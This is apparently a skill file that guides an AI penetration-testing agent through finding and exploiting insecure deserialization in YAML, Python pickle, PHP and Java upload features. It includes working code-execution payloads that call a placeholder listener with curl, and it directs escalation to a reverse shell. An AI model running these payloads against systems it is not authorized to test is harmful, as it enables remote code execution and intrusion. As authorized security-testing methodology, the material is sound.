---
name: insecure-deserialization
description: Methodology for identifying and exploiting unsafe deserialization across YAML (PyYAML unsafe load), Python Pickle, PHP unserialize(), and Java native deserialization in file upload / import / config features.
---

# INSECURE DESERIALIZATION METHODOLOGY

Execute when the target accepts a structured file upload or config payload intended to be "just data": YAML, PHP-serialized strings, Python pickles, Java serialized objects, or any "import config/playlist/settings" feature.

## 1. Identify the Format Before Attempting Exploitation
Do not guess. Confirm the exact deserialization library in play:
- **File extension / content-type hints**: `.yml`/`.yaml` → YAML; `.pkl`/binary blob starting with `\x80` → Python pickle; PHP array-like string `a:2:{...}` → PHP `unserialize()`; binary blob starting with `\xac\xed` → Java serialization.
- **Read the app's own source/JS if leaked** (via exposed `.git`, backup files, or error stack traces) for the actual parsing call: `yaml.load()` vs `yaml.safe_load()`, `pickle.loads()`, `unserialize()`, `ObjectInputStream.readObject()`. THIS is the actual vulnerability signal — `safe_load()`/allowlisted deserializers are not exploitable this way; unsafe/default loaders usually are.

## 2. YAML (PyYAML) — Confirm with Harmless Proof First
1. Test with a benign object-instantiation tag before attempting command execution:
```yaml
!!python/object/apply:os.getcwd []
```
2. If accepted without error (even if output isn't visible), escalate to an out-of-band callback to confirm actual execution rather than just parse-success:
```yaml
!!python/object/apply:os.system
args: ['curl http://<listener_ip>:<port>/deser-probe']
```
3. Only after confirming the out-of-band hit, escalate to a full reverse shell payload. Do not jump straight to a destructive/shell payload on an untested target — a parse error on a shell payload gives no information about whether the vector exists at all, while a clean staged escalation does.

## 3. Python Pickle
1. Pickle exploitation requires crafting a malicious object whose `__reduce__` method executes on deserialization. Use a minimal probe class first:
```python
import pickle, os
class Probe:
    def __reduce__(self):
        return (os.system, ('curl http://<listener_ip>:<port>/pickle-probe',))
payload = pickle.dumps(Probe())
```
2. Submit the raw bytes to the target's upload/import field exactly as pickle would produce them — do not base64-wrap unless the target's own upload mechanism expects base64 (check by testing a benign valid pickle first and observing whether it round-trips correctly).

## 4. PHP `unserialize()`
1. Requires an existing class with a "magic method" (`__wakeup`, `__destruct`, `__toString`) that performs a dangerous action, present somewhere in the application's own codebase (check leaked source via `.git` exposure or composer package listings for known-vulnerable libraries — this is a **gadget chain** problem, not a generic payload problem).
2. If source isn't available, check for known public gadget chains matching any identified framework/library versions (e.g. via PHPGGC) before attempting to hand-craft one blind.
3. Confirm the vector accepts serialized PHP data at all first with a harmless payload (`O:8:"stdClass":0:{}`) before investing time in gadget chain construction.

## 5. Java Native Deserialization
1. Confirm the binary signature (`\xac\xed\x00\x05` magic bytes) in a response or expected upload format.
2. Requires a known-vulnerable library on the classpath (Commons-Collections, Jackson, etc.) — fingerprint dependencies from any exposed error stack trace, `pom.xml`/`build.gradle` in leaked source, or JAR listing if reachable.
3. Use `ysoserial`-style gadget chains matched to the confirmed library version, not generic.

## 6. Source Verification (Explain the Root Cause, Don't Just Exploit Blind)
If source becomes available at any point (git exposure, backup file, decompiled JAR), locate and cite the EXACT unsafe call:
```python
# Vulnerable
data = yaml.load(uploaded_file)
# Safe
data = yaml.safe_load(uploaded_file)
```
This single-line root cause is what makes the finding reportable with confidence rather than "it seemed to work."

## 7. Verification & Evidence
1. Command execution must be confirmed via an out-of-band callback or a readable command output (e.g. `id`, `whoami`) reflected back — a parse-success alone is not proof of code execution.
2. Escalate to a full reverse shell only after OOB confirmation.
3. Capture terminal proof of the resulting shell and record the finding:
```json
{"tool": "record_finding", "args": {"title": "Remote Code Execution via Insecure <YAML/Pickle/PHP/Java> Deserialization", "kind": "insecure_deserialization", "severity": "critical", "request_ref": "<upload_endpoint>", "note": "Confirmed via out-of-band callback prior to shell escalation. Root cause: <exact unsafe call if source was available>."}}
```

## Rule of Exhaustion
A rejected malicious tag doesn't mean the endpoint is safe — test every format's harmless probe (Step 2/3/4/5) before ruling deserialization out entirely, since apps sometimes accept multiple serialization formats on the same endpoint depending on `Content-Type`.
